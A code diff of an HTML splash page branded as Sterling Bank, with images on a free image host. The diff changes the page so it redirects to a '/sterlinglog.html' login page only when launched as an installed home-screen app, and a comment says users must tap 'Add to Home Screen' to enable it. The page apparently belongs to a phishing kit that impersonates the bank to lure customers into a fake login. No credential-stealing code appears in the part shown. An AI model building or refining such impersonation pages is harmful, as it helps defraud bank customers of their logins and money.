@@ -2,27 +2,21 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
     
-    <!-- iOS App Meta Tags for "Add to Home Screen" -->
+    <!-- CRITICAL iOS App Meta Tags -->
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
     <meta name="apple-mobile-web-app-title" content="Sterling" />
     
-    <!-- Apple Touch Icon for iPhone Home Screen (App Logo) -->
+    <!-- Apple Touch Icon for iPhone Home Screen -->
     <link rel="apple-touch-icon" href="https://iili.io/n3jlvSV.jpg" />
     
     <title>Sterling Bank</title>
     
     <style>
-        /* ===== RESET & BASE ===== */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
             min-height: 100vh;
@@ -32,8 +26,6 @@
             background: #0d0d0f;
             overflow: hidden;
         }
-
-        /* ===== SPLASH CONTAINER ===== */
         .splash-container {
             width: 100%;
             height: 100vh;
@@ -43,7 +35,6 @@
             background: #0d0d0f;
             position: relative;
         }
-
         .splash-image {
             width: 100%;
             height: 100%;
@@ -51,56 +42,41 @@
             opacity: 0;
             animation: fadeIn 0.8s ease-out 0.2s forwards;
         }
-
-        /* ===== ANIMATIONS ===== */
         @keyframes fadeIn {
-            0% {
-                opacity: 0;
-                transform: scale(1.02);
-            }
-            100% {
-                opacity: 1;
-                transform: scale(1);
-            }
-        }
-
-        /* ===== RESPONSIVE ===== */
-        @media (max-width: 480px) {
-            /* no extra styles needed */
+            0% { opacity: 0; transform: scale(1.02); }
+            100% { opacity: 1; transform: scale(1); }
         }
     </style>
 </head>
 <body>
 
     <div class="splash-container">
-        <!-- Splash Image (Original Link) -->
-        <img
-        src="https://iili.io/n3YLIdG.jpg"
-        alt="Sterling Bank"
-        class="splash-image"
-        id="splashImage"
-        />
+        <img src="https://iili.io/n3YLIdG.jpg" alt="Sterling Bank" class="splash-image" id="splashImage" />
     </div>
 
-    <!-- ===== JAVASCRIPT ===== -->
     <script>
         (function() {
             'use strict';
 
-            // ---- Wait 3 seconds then redirect to Sterling Login ----
-            const redirectDelay = 3000; // 3 seconds
+            // Detect standalone mode (iOS)
+            const isStandalone = window.navigator.standalone === true || window.matchMedia('(display-mode: standalone)').matches;
 
-            setTimeout(function() {
-                window.location.href = '/sterlinglog.html';
-            }, redirectDelay);
+            // ONLY redirect if in standalone mode (App)
+            if (isStandalone) {
+                const redirectDelay = 3000;
+                setTimeout(function() {
+                    window.location.href = '/sterlinglog.html';
+                }, redirectDelay);
+            }
+            // If NOT in standalone mode, the redirect is disabled. 
+            // Users must tap "Add to Home Screen" to enable the redirect.
 
-            // ---- Optional: preload image to ensure it's cached ----
             const img = document.getElementById('splashImage');
             if (img.complete) {
                 // Image already loaded
             } else {
                 img.addEventListener('load', function() {
-                    // Image loaded, timer already running
+                    // Image loaded
                 });
             }
 
